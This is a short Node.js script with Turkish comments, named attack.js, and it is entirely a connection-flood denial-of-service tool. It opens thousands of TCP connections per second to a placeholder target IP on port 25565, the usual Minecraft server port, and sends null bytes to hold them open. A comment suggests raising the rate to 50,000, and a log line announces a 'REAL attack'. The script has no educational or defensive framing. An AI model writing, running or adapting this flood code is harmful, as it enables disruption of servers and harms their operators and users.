// DOSYA ADI: attack.js
const net = require('net');

const target = {
    host: 'HEDEF_IP_ADRESI', // Buraya vurulacak IP
    port: 25565,             // Buraya port
    threads: 5000            // Saniyede açılacak bağlantı sayısı (Ryzen 9'da 50.000 yapabilirsin)
};

function launch() {
    for (let i = 0; i < target.threads; i++) {
        const client = new net.Socket();
        client.connect(target.port, target.host, () => {
            // Bağlantı kurulduğunda boş paket gönderip açık tutuyoruz
            client.write('\x00\x00\x00\x00'); 
        });

        client.on('error', () => {
            client.destroy(); // Bağlantı koparsa hemen yenisini aç
        });
    }
    console.log(`[ATTACK] ${target.host} hedefine GERÇEK saldırı yapılıyor...`);
}

setInterval(launch, 1000); // Her saniye döngüyü tazele
